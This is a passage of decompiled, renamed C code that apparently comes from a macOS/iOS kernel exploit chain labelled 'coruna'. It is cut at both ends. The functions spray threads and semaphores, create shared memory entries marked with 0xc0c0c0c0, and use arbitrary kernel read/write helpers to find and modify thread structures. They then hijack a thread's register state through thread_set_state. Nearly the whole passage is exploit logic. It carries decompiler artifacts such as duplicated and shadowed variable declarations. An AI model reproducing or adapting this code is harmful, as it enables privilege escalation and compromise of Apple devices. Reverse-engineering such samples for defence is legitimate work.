  ___stack_chk_fail();
}





void coruna_kernel509_residual_296(long *handle,uint64_t val,uint64_t id_2)
{
  long scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  
  host_info = *(uint64_t *)k_kernel_stack_chk_guard_slot;
  scratch = handle[0x53] + 0xefd8;
  bootargs = 0;
  bootargs = 0;
  thread_attr = 0;
  thread_attr = 0;
  scratch = id_2;
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(*handle + 8),handle,k_kernel_rodata_word_48018,6,&scratch);
}





void coruna_kernel509_residual_297(long *handle,uint64_t val)
{
  long handle;
  uint64_t *ptr;
  uint64_t scratch[17];
  uint64_t bootargs;
  
  handle = 0;
  bootargs = *(uint64_t *)k_kernel_stack_chk_guard_slot;
  scratch[0xe] = 0;
  scratch[0xb] = 0;
  scratch[10] = 0;
  scratch[0xd] = 0;
  scratch[0xc] = 0;
  scratch[7] = 0;
  scratch[6] = 0;
  scratch[9] = 0;
  scratch[8] = 0;
  scratch[3] = 0;
  scratch[2] = 0;
  scratch[5] = 0;
  scratch[4] = 0;
  scratch[1] = 0;
  scratch[0] = 0;
  ptr = (uint64_t *)ghidra_reg_5;
  do {
    *(uint64_t *)((long)scratch + handle) = *ptr;
    handle = handle + 8;
    ptr = ptr + 1;
  } while (handle != 0x40);
  scratch[0xf] = val;
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(*handle + 8),handle,k_kernel_rodata_word_48000,0x10,scratch);
}





void coruna_call_indirect_b0fc_13780(long handle)
{
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(handle + 0x10));
}
void coruna_mach_make_memory_entry_137c0(long handle)
{
  long *ptr;
  uint u;
  thread_act_t target_act;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  vm_address_t lv6;
  vm_address_t lv7;
  uint tag;
  mach_port_t lm9;
  int err;
  long handle;
  long addr;
  long off;
  unsigned long kind;
  long base;
  unsigned long type_id;
  long ctx_val;
  long serial;
  uint64_t type_id_8;
  uint8_t *ptr;
  int status;
  unsigned long type_id_9;
  unsigned long type_id_10;
  unsigned long type_id_11;
  uint64_t type_id_12;
  long serial_7;
  uint64_t type_id_13;
  long *buf;
  unsigned long type_id_14;
  task_t *str;
  long serial_8;
  unsigned long offset;
  vm_inherit_t inheritance;
  uint64_t in_stack_fffffffffffff950;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  long *action;
  semaphore_t block_ctx;
  semaphore_t stack_guard;
  natural_t sa_saved [68];
  uint8_t *sa_new;
  uint64_t path_buf;
  void (*tmp_buf)(void);
  uint8_t *region;
  long plist;
  long url_buf;
  unsigned long json_buf;
  unsigned long frame;
  long work;
  vm_size_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint cache_22;
  mem_entry_name_port_t cache_23;
  vm_address_t cache_24;
  uint64_t cache_25;
  uint64_t scratch;
  uint8_t *cache_26;
  uint64_t cache_27;
  void (*cache_28)(void);
  uint8_t *cache_29;
  long *cache_30;
  thread_act_t *cache_31;
  uint64_t *cache_32;
  semaphore_t cache_33;
  semaphore_t cache_34;
  pthread_t cache_35;
  long cache_36;
  vm_address_t cache_37;
  vm_address_t cache_38;
  thread_act_t cache_39;
  thread_act_t cache_40;
  mem_entry_name_port_t cache_41;
  vm_address_t cache_42;
  vm_size_t cache_43;
  uint64_t *cache_44;
  uint cache_45;
  semaphore_t cache_46;
  semaphore_t cache_47;
  thread_act_t cache_48;
  thread_act_t cache_49 [61];
  uint64_t cache_50;
  uint64_t bootargs;
  uint64_t cache_51;
  uint64_t thread_attr;
  uint64_t cache_52[34];
  
  ptr = k_kernel_mach_task_self_slot;
  cache_52[0x20] = *(uint64_t *)k_kernel_stack_chk_guard_slot;
  buf = (long *)(handle + 8);
  status = *(int *)(*(long *)(*buf + 0x20) + 0x140);
  cache_49[0] = 0;
  _thread_create(*(task_t *)k_kernel_mach_task_self_slot,cache_49);
  cache_48 = 0;
  _thread_create(*(task_t *)ptr,&cache_48);
  cache_47 = 0;
  _semaphore_create(*(task_t *)ptr,&cache_47,0,0);
  cache_46 = 0;
  _semaphore_create(*(task_t *)ptr,&cache_46,0,0);
  cache_45 = 0;
  handle = coruna_kernel509_via_fn_ptr_cast_10_25(*(uint64_t *)(*buf + 0x20),0,&cache_45);
  do {
    ptr = k_kernel_mach_task_self_slot;
    cache_44 = (uint64_t *)0x0;
    cache_43 = 0x4000;
    cache_42 = 0;
    _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&cache_42,0xc000,0,1,0,0,0,0,2,
            (vm_inherit_t)in_stack_fffffffffffff950);
    cache_44 = (uint64_t *)(cache_42 + 0x4000);
    _vm_allocate(*(vm_map_t *)ptr,(vm_address_t *)&cache_44,cache_43,0x4000);
    *cache_44 = 0xc0c0c0c0c0c0c0c0;
    _mach_make_memory_entry(*(vm_map_t *)ptr,&cache_43,(vm_offset_t)cache_44,3,&cache_41,0);
    addr = coruna_ret_stub_3(*buf,cache_41);
    off = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*buf,addr + 0x10);
    off = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*buf,off + 0x18);
    kind = coruna_kernel509_residual_294(*buf,off + 0x3c);
    if ((int)kind < 0) {
      serial_8 = (kind & 0x7fffffff) * 0x30;
    }
    else {
      serial_8 = ((kind & 0xffffffff) << ((unsigned long)cache_45 & 0x3f)) + handle;
    }
    base = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*buf,serial_8 + 0x20);
    tag = coruna_kernel509_residual_294(*buf,serial_8);
  } while (-1 < (int)tag);
  kind = 0;
  type_id_10 = base + (unsigned long)tag * -0x30 + 0x1800000000;
  base = *(long *)(handle + 8);
  type_id_11 = *(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(base + 0x20));
  type_id_14 = *(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(base + 0x20));
  do {
    serial = type_id_10 + (kind & 0xfffffff0);
    type_id = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(base,serial + 0x18);
    if ((type_id_11 <= type_id && type_id < type_id_14) && (type_id & 0x3fff) == 0) {
      type_id = coruna_kernel509_residual_294(*(uint64_t *)(handle + 8),serial + 0x20);
      *(unsigned long *)(handle + 0x20) = type_id & 0xffffffff;
      if ((int)type_id != 0) {
        if ((int)type_id < 0) {
          base = type_id_10 + (type_id & 0x7fffffff) * 0x30;
        }
        else {
          base = ((type_id & 0xffffffff) << ((unsigned long)cache_45 & 0x3f)) + handle;
        }
        tag = coruna_kernel509_residual_294(*buf,base + 0x30);
        if (0xfff < tag) {
          coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(*buf,addr + 0x18,0,1);
          coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(*buf,addr + 0x20,0xffffffffffffc000,1);
          str = (task_t *)k_kernel_mach_task_self_slot;
          cache_40 = 0;
          err = 0x100;
          do {
            _thread_create(*str,&cache_40);
            port = k_kernel_rodata_word_43488;
            version = k_kernel_rodata_word_00043058;
            size = k_kernel_rodata_word_43050;
            type_id_13 = k_kernel_rodata_word_00043048;
            type_id_8 = k_kernel_rodata_word_43040;
            err = err + -1;
          } while (err != 0);
          tag = 0;
          cache_39 = 0;
          off = off + 0x30;
          kind = serial_8 - handle;
          do {
            _thread_create(*str,&cache_39);
            *(uint32_t *)(handle + 0x2a0) = 0;
            type_id_14 = coruna_ret_stub_3(*(uint64_t *)(handle + 8),cache_39);
            addr = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(uint64_t *)(handle + 8),k_kernel_rodata_word_48008 + type_id_14);
            type_id = coruna_kernel509_via_fn_ptr_cast_10_9(*(uint64_t *)(*(long *)(handle + 8) + 0x20),addr);
            type_id_11 = type_id + 0x110;
            offset = type_id & 0xffffffffffffc000;
            ptr = (uint8_t *)(type_id & 0x3fff);
            if ((type_id_11 & 0x3f) != 0x10 && ptr < &UNK_00003ec1) {
              cache_38 = 0;
              thread_attr = 0;
              cache_51 = 0;
              bootargs = 0;
              cache_50 = 0;
              coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub(*(uint64_t *)(handle + 8),off,&cache_50,0x20,1);
              bootargs = coruna_u64_pack(((int)*(uint64_t *)(handle + 0x20)), ((uint32_t))bootargs);
              coruna_call_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 8),off,&cache_50,0x20,1);
              _vm_map(*str,&cache_38,0x4000,0,1,cache_41,type_id_14 & 0xffffffffffffc000,0,3,1,
                      (vm_inherit_t)base);
              thread_attr = 0;
              cache_51 = 0;
              bootargs = 0;
              cache_50 = 0;
              coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub(*(uint64_t *)(handle + 8),off,&cache_50,0x20,1);
              bootargs = coruna_u64_pack(((int)(kind >> ((unsigned long)cache_45 & 0x3f))), ((uint32_t))bootargs);
              coruna_call_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 8),off,&cache_50,0x20,1);
              lv7 = cache_38;
              serial = k_kernel_rodata_word_48008;
              cache_37 = 0;
              thread_attr = 0;
              cache_51 = 0;
              bootargs = 0;
              cache_50 = 0;
              coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub(*(uint64_t *)(handle + 8),off,&cache_50,0x20,1);
              bootargs = coruna_u64_pack(((int)*(uint64_t *)(handle + 0x20)), ((uint32_t))bootargs);
              coruna_call_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 8),off,&cache_50,0x20,1);
              _vm_map(*str,&cache_37,0x4000,0,1,cache_41,offset,0,3,1,(vm_inherit_t)base);
              thread_attr = 0;
              cache_51 = 0;
              bootargs = 0;
              cache_50 = 0;
              coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub(*(uint64_t *)(handle + 8),off,&cache_50,0x20,1);
              bootargs = coruna_u64_pack(((int)(kind >> ((unsigned long)cache_45 & 0x3f))), ((uint32_t))bootargs);
              coruna_call_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 8),off,&cache_50,0x20,1);
              lv6 = cache_37;
              cache_36 = 0;
              cache_52[0x1f] = 0;
              cache_52[0x1e] = 0;
              cache_52[0x1d] = 0;
              cache_52[0x1c] = 0;
              cache_52[0x1b] = 0;
              cache_52[0x1a] = 0;
              cache_52[0x19] = 0;
              cache_52[0x18] = 0;
              cache_52[0x17] = 0;
              cache_52[0x16] = 0;
              cache_52[0x15] = 0;
              cache_52[0x14] = 0;
              cache_52[0x13] = 0;
              cache_52[0x12] = 0;
              cache_52[0x11] = 0;
              cache_52[0x10] = 0;
              cache_52[0xf] = 0;
              cache_52[0xe] = 0;
              cache_52[0xd] = 0;
              cache_52[0xc] = 0;
              cache_52[0xb] = 0;
              cache_52[10] = 0;
              cache_52[9] = 0;
              cache_52[8] = 0;
              cache_52[7] = 0;
              cache_52[6] = 0;
              cache_52[5] = 0;
              cache_52[4] = 0;
              cache_52[3] = 0;
              cache_52[2] = 0;
              cache_52[1] = 0;
              cache_52[0] = 0;
              cache_26 = k_kernel_nsconcretestackblock_slot;
              cache_27 = port;
              cache_28 = coruna_thread_terminate;
              cache_29 = &k_kernel_rodata_word_446c0;
              cache_33 = cache_46;
              cache_34 = cache_47;
              cache_30 = &cache_36;
              cache_31 = &cache_39;
              cache_32 = cache_52;
              _pthread_create(&cache_35,(pthread_attr_t *)0x0,(void **)coruna_call_indirect_b0fc_13780,&cache_26);
              _semaphore_wait(cache_47);
              lm9 = _pthread_mach_thread_np(cache_35);
              scratch = type_id_13;
              cache_25 = type_id_8;
              _thread_policy_set(lm9,2,(thread_policy_t)&cache_25,4);
              ctx_val = coruna_ret_stub_3(*(uint64_t *)(handle + 8),lm9);
              if (tag == 0) {
                type_id_9 = 0xfc;
                do {
                  err = coruna_kernel509_residual_294(*buf,ctx_val + type_id_9 + 4);
                  u = tag;
                  if (err == (int)cache_25) {
                    err = coruna_kernel509_residual_294(*buf,ctx_val + type_id_9 + 8);
                    if (err == cache_25) {
                      err = coruna_kernel509_residual_294(*buf,ctx_val + type_id_9 + 0xc);
                      u = (int)type_id_9 + 4;
                      if (err != (int)scratch) {
                        u = tag;
                      }
                    }
                  }
                  tag = u;
                  type_id_9 = type_id_9 + 4;
                } while (type_id_9 < 0x2fc);
              }
              ptr = (long *)(lv7 + (type_id_14 & 0x3fff) + serial);
              coruna_call_mach_vm_machine_attribute(*(uint64_t *)(handle + 8),ctx_val + (unsigned long)tag + 4,1,1);
              scratch = version;
              cache_25 = size;
              lm9 = _mach_thread_self();
              _thread_policy_set(lm9,2,(thread_policy_t)&cache_25,4);
              type_id_12 = *(uint64_t *)(handle + 8);
              lm9 = _mach_thread_self();
              serial = coruna_ret_stub_3(type_id_12,lm9);
              serial = serial + (unsigned long)tag;
              coruna_call_mach_vm_machine_attribute(*(uint64_t *)(handle + 8),serial,0x7fffffff,1);
              coruna_call_mach_vm_machine_attribute(*(uint64_t *)(handle + 8),serial + 4,0x7fffffff,1);
              coruna_call_mach_vm_machine_attribute(*(uint64_t *)(handle + 8),serial + 8,0x7fffffff,1);
              coruna_call_mach_vm_machine_attribute(*(uint64_t *)(handle + 8),serial + 0xc,0x100,1);
              coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 8),serial + 0x10,0xfffffffffffffff,1);
              _semaphore_signal(cache_46);
              ptr[-1] = 0;
              serial = *(long *)(ptr + lv6 + 0x128);
              u = 0x400204;
              if ((*(uint *)(ptr + lv6 + 0x110) & 0x1000) != 0) {
                u = 0x400208;
              }
              *(uint *)(handle + 0x294) = u;
              *(uint *)(handle + 0x290) = u | 0x3c0;
              *(uint *)(ptr + lv6 + 0x110) = u | 0x3c0;
              if (status < 0x2712) {
                *ptr = 0;
              }
              _thread_switch(0,0,0);
              cache_36 = 1;
              do {
                if (*ptr != 0) {
                  serial_7 = ptr[-1];
                  ctx_val = coruna_kernel509_via_fn_ptr_cast_10_9(*(uint64_t *)(*buf + 0x20));
                  if (ctx_val == serial_7) {
                    *ptr = addr;
                    goto fail;
                  }
                }
              } while (cache_36 == 1);
              serial_7 = 0;
fail:
              _pthread_join(cache_35,(void **)0x0);
              if (status < 0x2712) {
                *ptr = serial_7;
              }
              ctx_val = 0;
              do {
                if ((*(int *)((long)cache_52 + ctx_val) != 0) &&
                   (type_id_9 = coruna_ret_stub_3(*buf), type_id_9 == type_id_14)) {
                  cache_36 = 3;
                  *(uint32_t *)(handle + 0x2a0) = *(uint32_t *)((long)cache_52 + ctx_val);
                  *(uint32_t *)((long)cache_52 + ctx_val) = 0;
                  break;
                }
                ctx_val = ctx_val + 4;
              } while (ctx_val != 0x100);
              if ((serial != *(long *)(ptr + lv6 + 0x128) &&
                  *(long *)(ptr + lv6 + 0x128) != 0) && cache_36 == 3) {
                status = *(int *)(*(long *)(*buf + 0x20) + 0x140);
                err = coruna_fn_ptr_cast_10(*(long *)(*buf + 0x20),0x5584201);
                if (0x225b < status) {
                  serial = 0xb8;
                  if (err != 0) {
                    serial = 0x70;
                  }
                  serial = serial + (type_id_14 & 0x3fff);
                  tag = *(uint *)(serial + cache_38);
                  if ((tag >> 0xf & 1) == 0) {
                    *(uint *)(cache_38 + serial) = tag | 0x8000;
                  }
                }
                status = 0x100;
                do {
                  _thread_create(*(task_t *)k_kernel_mach_task_self_slot,&cache_40);
                  if (cache_40 != 0) {
                    serial = coruna_ret_stub_3(*buf);
                    ctx_val = coruna_fn_ptr_cast_2(*(uint64_t *)(*buf + 0x20),serial);
                    if (ctx_val != 0) {
                      coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(*buf,serial + k_kernel_rodata_word_48008 + -8,0,1);
                      _thread_terminate(cache_40);
                      cache_40 = 0;
                    }
                  }
                  status = status + -1;
                } while (status != 0);
                coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(*buf,type_id_14 + k_kernel_rodata_word_48008 + -8,type_id,1);
                coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(*buf,k_kernel_rodata_word_48008 + type_id_14,addr,1);
                type_id_14 = coruna_kernel509_residual_294(*buf,base);
                if ((int)type_id_14 < 0) {
                  type_id_14 = type_id_10 + (type_id_14 & 0x7fffffff) * 0x30;
                }
                else {
                  type_id_14 = ((type_id_14 & 0xffffffff) << ((unsigned long)cache_45 & 0x3f)) + handle;
                }
                type_id_9 = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*buf,type_id_14 + 0x18);
                inheritance = (vm_inherit_t)base;
                while (type_id_9 != offset) {
                  type_id_14 = coruna_kernel509_residual_294(*buf,type_id_14 + 8);
                  if ((int)type_id_14 < 0) {
                    type_id_14 = type_id_10 + (type_id_14 & 0x7fffffff) * 0x30;
                  }
                  else {
                    type_id_14 = ((type_id_14 & 0xffffffff) << ((unsigned long)cache_45 & 0x3f)) + handle;
                  }
                  type_id_9 = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*buf,type_id_14 + 0x18);
                  inheritance = (vm_inherit_t)base;
                }
                if (type_id_14 < type_id_10) {
                  type_id_10 = type_id_14 - handle >> ((unsigned long)cache_45 & 0x3f);
                }
                else {
                  type_id_10 = (type_id_14 - type_id_10) / 0x30 | 0x80000000;
                }
                cache_24 = 0;
                thread_attr = 0;
                cache_51 = 0;
                bootargs = 0;
                cache_50 = 0;
                coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub(*(uint64_t *)(handle + 8),off,&cache_50,0x20,1);
                bootargs = coruna_u64_pack(((int)*(uint64_t *)(handle + 0x20)), ((uint32_t))bootargs);
                coruna_call_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 8),off,&cache_50,0x20,1);
                _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&cache_24,0x4000,0,1,cache_41,
                        offset,0,3,1,inheritance);
                thread_attr = 0;
                cache_51 = 0;
                bootargs = 0;
                cache_50 = 0;
                coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub(*(uint64_t *)(handle + 8),off,&cache_50,0x20,1);
                bootargs = coruna_u64_pack(((int)(kind >> ((unsigned long)cache_45 & 0x3f))), ((uint32_t))bootargs);
                coruna_call_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 8),off,&cache_50,0x20,1);
                *(uint8_t **)(handle + 0x18) = ptr + cache_24;
                coruna_call_mach_vm_machine_attribute(*(uint64_t *)(handle + 8),type_id_11,*(uint32_t *)(handle + 0x290),1)
                ;
                _memcpy(&cache_50,*(void **)(handle + 0x18),0x130);
                type_id_8 = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(uint64_t *)(handle + 8),serial_8);
                cache_20 = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(uint64_t *)(handle + 8),type_id_14 + 8);
                sa_new = k_kernel_nsconcretestackblock_slot;
                path_buf = port;
                tmp_buf = coruna_mach_make_memory_entry_14af0;
                region = &k_kernel_rodata_word_446e0;
                cache = cache_43;
                cache_22 = cache_45;
                cache_23 = cache_41;
                plist = handle;
                url_buf = serial_8;
                json_buf = type_id_10;
                frame = type_id_14;
                work = handle;
                cache_21 = type_id_8;
                handle = coruna_ret_stub_3(*(uint64_t *)(handle + 8),cache_48);
                type_id_13 = *(uint64_t *)(*(long *)(handle + 8) + 0x20);
                type_id_8 = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(long *)(handle + 8),k_kernel_rodata_word_48008 + handle);
                type_id_8 = coruna_kernel509_via_fn_ptr_cast_10_10(type_id_13,type_id_8);
                *(uint64_t *)(handle + 0x168) = type_id_8;
                handle = coruna_ret_stub_3(*(uint64_t *)(handle + 8),cache_49[0]);
                type_id_13 = *(uint64_t *)(*(long *)(handle + 8) + 0x20);
                type_id_8 = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(long *)(handle + 8),k_kernel_rodata_word_48008 + handle);
                type_id_8 = coruna_kernel509_via_fn_ptr_cast_10_10(type_id_13,type_id_8);
                *(uint64_t *)(handle + 0x178) = type_id_8;
                handle = coruna_mach_port_allocate_12eb0(handle,0x10000);
                *(long *)(handle + 0x298) = handle;
                sa_saved[0x3e] = 0;
                sa_saved[0x3f] = 0;
                sa_saved[0x3c] = 0;
                sa_saved[0x3d] = 0;
                sa_saved[0x42] = 0;
                sa_saved[0x43] = 0;
                sa_saved[0x40] = 0;
                sa_saved[0x41] = 0;
                sa_saved[0x36] = 0;
                sa_saved[0x37] = 0;
                sa_saved[0x34] = 0;
                sa_saved[0x35] = 0;
                sa_saved[0x3a] = 0;
                sa_saved[0x3b] = 0;
                sa_saved[0x38] = 0;
                sa_saved[0x39] = 0;
                sa_saved[0x2e] = 0;
                sa_saved[0x2f] = 0;
                sa_saved[0x2c] = 0;
                sa_saved[0x2d] = 0;
                sa_saved[0x32] = 0;
                sa_saved[0x33] = 0;
                sa_saved[0x30] = 0;
                sa_saved[0x31] = 0;
                sa_saved[0x26] = 0;
                sa_saved[0x27] = 0;
                sa_saved[0x24] = 0;
                sa_saved[0x25] = 0;
                sa_saved[0x2a] = 0;
                sa_saved[0x2b] = 0;
                sa_saved[0x28] = 0;
                sa_saved[0x29] = 0;
                sa_saved[0x1e] = 0;
                sa_saved[0x1f] = 0;
                sa_saved[0x1c] = 0;
                sa_saved[0x1d] = 0;
                sa_saved[0x22] = 0;
                sa_saved[0x23] = 0;
                sa_saved[0x20] = 0;
                sa_saved[0x21] = 0;
                sa_saved[0x16] = 0;
                sa_saved[0x17] = 0;
                sa_saved[0x14] = 0;
                sa_saved[0x15] = 0;
                sa_saved[0x1a] = 0;
                sa_saved[0x1b] = 0;
                sa_saved[0x18] = 0;
                sa_saved[0x19] = 0;
                sa_saved[0xe] = 0;
                sa_saved[0xf] = 0;
                sa_saved[0xc] = 0;
                sa_saved[0xd] = 0;
                sa_saved[0x12] = 0;
                sa_saved[0x13] = 0;
                sa_saved[0x10] = 0;
                sa_saved[0x11] = 0;
                sa_saved[6] = 0;
                sa_saved[7] = 0;
                sa_saved[4] = 0;
                sa_saved[5] = 0;
                sa_saved[10] = 0;
                sa_saved[0xb] = 0;
                sa_saved[8] = 0;
                sa_saved[9] = 0;
                sa_saved[2] = 0;
                sa_saved[3] = 0;
                sa_saved[0] = 0;
                sa_saved[1] = 0;
                *(uint64_t *)(handle + 0x278) = 0;
                *(uint64_t *)(handle + 0x270) = 0;
                *(uint64_t *)(handle + 0x288) = 0;
                *(uint64_t *)(handle + 0x280) = 0;
                *(uint64_t *)(handle + 600) = 0;
                *(uint64_t *)(handle + 0x250) = 0;
                *(uint64_t *)(handle + 0x268) = 0;
                *(uint64_t *)(handle + 0x260) = 0;
                *(uint64_t *)(handle + 0x238) = 0;
                *(uint64_t *)(handle + 0x230) = 0;
                *(uint64_t *)(handle + 0x248) = 0;
                *(uint64_t *)(handle + 0x240) = 0;
                *(uint64_t *)(handle + 0x218) = 0;
                *(uint64_t *)(handle + 0x210) = 0;
                *(uint64_t *)(handle + 0x228) = 0;
                *(uint64_t *)(handle + 0x220) = 0;
                *(uint64_t *)(handle + 0x1f8) = 0;
                *(uint64_t *)(handle + 0x1f0) = 0;
                *(uint64_t *)(handle + 0x208) = 0;
                *(uint64_t *)(handle + 0x200) = 0;
                *(uint64_t *)(handle + 0x1d8) = 0;
                *(uint64_t *)(handle + 0x1d0) = 0;
                *(uint64_t *)(handle + 0x1e8) = 0;
                *(uint64_t *)(handle + 0x1e0) = 0;
                *(uint64_t *)(handle + 0x1b8) = 0;
                *(uint64_t *)(handle + 0x1b0) = 0;
                *(uint64_t *)(handle + 0x1c8) = 0;
                *(uint64_t *)(handle + 0x1c0) = 0;
                *(uint64_t *)(handle + 0x198) = 0;
                *(uint64_t *)(handle + 400) = 0;
                *(uint64_t *)(handle + 0x1a8) = 0;
                *(uint64_t *)(handle + 0x1a0) = 0;
                *(uint64_t *)(handle + 0x180) = *(uint64_t *)(handle + 0x168);
                *(uint64_t *)(handle + 0x188) = 0xc0c0c0c0;
                *(uint64_t *)(handle + 0x228) = *(uint64_t *)(handle + 0x178);
                *(uint64_t *)(handle + 0x280) = k_kernel_rodata_word_48010;
                *(uint64_t *)(handle + 0x270) = k_kernel_rodata_word_48030;
                *(long *)(handle + 0x278) = handle + 0x7f00;
                *(uint64_t *)(handle + 0x268) = 0xc0c0c0c0c0c0c0c0;
                coruna_call_mach_vm_machine_attribute(*(uint64_t *)(handle + 8),handle,0xc0c0c0c0,1);
                kind = 0xffffffffffffc000;
                do {
                  coruna_call_mach_vm_machine_attribute(*(uint64_t *)(handle + 8),
                               kind + *(long *)(handle + 0x298) + 0x8000,
                               (int)kind + -0x3f3ebf40,1);
                  kind = kind + 0x4000;
                } while (kind < 0x8000);
                _memcpy(*(void **)(handle + 0x18),&cache_50,0x130);
                _thread_set_state(*(thread_act_t *)(handle + 0x2a0),6,
                                  (thread_state_t)(handle + 0x180),0x44);
                coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(uint64_t *)(handle + 8),type_id + 0x128);
                _memcpy(*(void **)(handle + 0x18),&cache_50,0x130);
                _thread_set_state(*(thread_act_t *)(handle + 0x2a0),6,sa_saved,0x44);
                coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(uint64_t *)(handle + 8),type_id + 0x128);
                coruna_kernel509_residual_294(*(uint64_t *)(handle + 8),type_id_11);
                _memcpy(*(void **)(handle + 0x18),&cache_50,0x130);
                cache_36 = 0;
                scratch = k_kernel_nsconcretestackblock_slot;
                bootargs = port;
                thread_attr = coruna_thread_set_state;
                host_info = &k_kernel_rodata_word_44700;
                block_ctx = cache_46;
                stack_guard = cache_47;
                serial_buf = handle;
                action = &cache_36;
                _pthread_create(&cache_35,(pthread_attr_t *)0x0,(void **)coruna_call_indirect_b0fc_13780,&scratch);
                _semaphore_wait(cache_47);
                _semaphore_signal(cache_46);
                *(uint64_t *)(*(long *)(handle + 0x18) + 0xf0) = 0;
                coruna_kernel509_via_helper_5d2c_419fc_2(tmp_buf,&sa_new,8);
              }
              if (1 < *(thread_act_t *)(handle + 0x2a0) + 1) {
                _thread_terminate(*(thread_act_t *)(handle + 0x2a0));
                *(uint32_t *)(handle + 0x2a0) = 0;
              }
              str = (task_t *)k_kernel_mach_task_self_slot;
              addr = 0;
              do {
                target_act = *(thread_act_t *)((long)cache_52 + addr);
                if (target_act != 0) {
                  _thread_terminate(target_act);
                }
                addr = addr + 4;
              } while (addr != 0x100);
            }
            if (cache_39 != 0) {
              _thread_terminate(cache_39);
            }
          } while( true );
        }
      }
    }
    base = *buf;
    kind = kind + 0x30;
  } while( true );
}
void coruna_thread_terminate(long handle)
{
  uint64_t *ptr;
  uint8_t *buf;
  long handle;
  
  ___semwait_signal(*(uint32_t *)(handle + 0x38),*(uint32_t *)(handle + 0x3c),0,0,0,0);
  do {
  } while (**(long **)(handle + 0x20) == 0);
  _thread_terminate(**(thread_act_t **)(handle + 0x28));
  buf = k_kernel_mach_task_self_slot;
  handle = 0;
  do {
    _thread_create(*(task_t *)buf,(thread_act_t *)(*(long *)(handle + 0x30) + handle));
    handle = handle + 4;
  } while (handle != 0x100);
  ptr = *(uint64_t **)(handle + 0x20);
  **(uint32_t **)(handle + 0x28) = 0;
  *ptr = 2;
  return;
}
void coruna_mach_make_memory_entry_14af0(long handle,int flags)
{
  long handle;
  uint8_t *ptr;
  unsigned long u;
  mem_entry_name_port_t scratch;
  
  scratch = 0;
  handle = *(long *)(handle + 0x20);
  coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 8),*(uint64_t *)(handle + 0x28),
               *(unsigned long *)(handle + 0x30) | *(unsigned long *)(handle + 0x30) << 0x20,1);
  u = (unsigned long)(*(long *)(handle + 0x28) - *(long *)(handle + 0x40)) >>
          ((unsigned long)*(uint *)(handle + 0x60) & 0x3f);
  coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 8),*(long *)(handle + 0x38) + 8,u | u << 0x20,1);
  ptr = k_kernel_mach_task_self_slot;
  _mach_make_memory_entry
            (*(vm_map_t *)k_kernel_mach_task_self_slot,(vm_size_t *)(handle + 0x48),0,
             flags << 0x18 | 0x10003,&scratch,*(mem_entry_name_port_t *)(handle + 100));
  coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 8),*(long *)(handle + 0x38) + 8,
               *(uint64_t *)(handle + 0x50),1);
  coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 8),*(uint64_t *)(handle + 0x28),
               *(uint64_t *)(handle + 0x58),1);
  _mach_port_destroy(*(ipc_space_t *)ptr,scratch);
  return;
}
void coruna_thread_set_state(long handle)
{
  long handle;
  
  handle = *(long *)(handle + 0x20);
  ___semwait_signal(*(uint32_t *)(handle + 0x30),*(uint32_t *)(handle + 0x34),0,0,0,0);
  do {
  } while (**(long **)(handle + 0x28) == 0);
  _thread_set_state(*(thread_act_t *)(handle + 0x2a0),6,(thread_state_t)(handle + 0x180),0x44);
  return;
}
void coruna_vm_deallocate_14c6c(long handle)
{
  uint8_t *ptr;
  int err;
  long handle;
  uint64_t u;
  vm_address_t address;
  long addr;
  uint64_t size;
  long off;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  long thread_attr;
  
